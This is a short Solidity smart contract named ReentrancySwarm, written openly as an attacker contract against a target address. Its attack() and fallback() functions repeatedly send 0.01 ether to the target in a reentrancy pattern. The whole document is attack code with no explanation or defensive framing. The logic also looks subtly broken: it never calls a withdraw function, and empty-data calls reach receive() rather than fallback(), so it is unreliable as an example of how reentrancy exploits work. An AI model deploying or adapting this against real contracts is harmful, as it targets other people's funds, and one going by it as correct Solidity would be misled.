contract ReentrancySwarm {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    fallback() external payable {
        if (gasleft() > 50000) {
            (bool ok, ) = target.call{value: 0.01 ether}("");
            require(ok);
        }
    }

    function attack() public payable {
        (bool ok, ) = target.call{value: 0.01 ether}("");
        require(ok);
    }

    receive() external payable {}
}
